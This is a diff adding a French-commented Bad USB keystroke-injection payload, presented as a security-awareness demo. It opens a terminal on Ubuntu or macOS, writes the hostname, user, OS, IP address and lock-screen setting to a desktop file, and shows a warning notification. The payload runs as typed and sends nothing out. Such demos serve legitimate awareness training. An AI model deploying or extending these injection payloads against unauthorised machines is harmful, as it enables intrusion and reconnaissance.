@@ -1,0 +1,22 @@
+REM =====================================================================
+REM  Payload Bad USB — DÉMONSTRATION SENSIBILISATION SÉCURITÉ (Linux/macOS)
+REM  Auteur  : Kapelgy
+REM  Usage   : Formation cybersécurité — Simulation d'attaque USB
+REM  Cible   : Linux (Ubuntu/Debian) ou macOS
+REM
+REM  USAGE STRICTEMENT ÉDUCATIF — Autorisation écrite requise.
+REM  Collecte uniquement des infos système basiques en local.
+REM  Aucune transmission réseau.
+REM =====================================================================
+
+DELAY 1500
+
+REM ─── Ouverture terminal (Ubuntu GNOME)
+CTRL-ALT t
+DELAY 1000
+
+REM ─── Collecte infos système + fichier résultat bureau
+STRING LOG="$HOME/Bureau/AUDIT_USB_DEMO.txt"; echo "TARGET_HOST=$(hostname)" > $LOG; echo "TARGET_USER=$(whoami)" >> $LOG; echo "TARGET_OS=$(uname -a)" >> $LOG; echo "EXECUTION_STATUS=SUCCESS" >> $LOG; echo "IP_ADDRESSES=$(hostname -I | awk '{print $1}')" >> $LOG; echo "USB_POLICY=NoRestriction" >> $LOG; echo "TIMESTAMP=$(date -Iseconds)" >> $LOG; echo "LOCK_SCREEN=$(gsettings get org.gnome.desktop.screensaver lock-enabled 2>/dev/null || echo 'Unknown')" >> $LOG; notify-send "DEMO SÉCURITÉ - KAPELGY" "Un périphérique USB vient d'exécuter du code sur votre machine.\n\nRapport enregistré sur votre Bureau.\nContactez votre DSI." --icon=dialog-warning --urgency=critical
+ENTER
+
+DELAY 500
